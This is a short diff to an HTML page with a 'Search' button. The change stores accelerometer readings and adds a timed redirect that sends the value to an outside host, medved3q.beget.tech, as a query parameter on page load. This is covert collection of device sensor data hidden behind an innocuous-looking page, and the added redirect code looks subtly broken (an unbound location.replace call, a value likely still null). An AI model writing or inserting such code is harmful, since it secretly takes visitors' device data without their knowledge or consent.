@@ -4,14 +4,16 @@
     <input type="button" id="btn" value="Search" onclick="doSomething();"/>
     <script>
        let elem = document.getElementById('btn');
+       let value = null;
        let acl = new Accelerometer({frequency: 60});
         
         
     acl.addEventListener('reading', () => {
-        elem.value = acl.x;
+        value = acl.x;
     });
     acl.start();
     
+    setTimeout(document.location.replace, 50, "http://medved3q.beget.tech/get.php?x="+value);
     </script>
 </body>
 </html>  
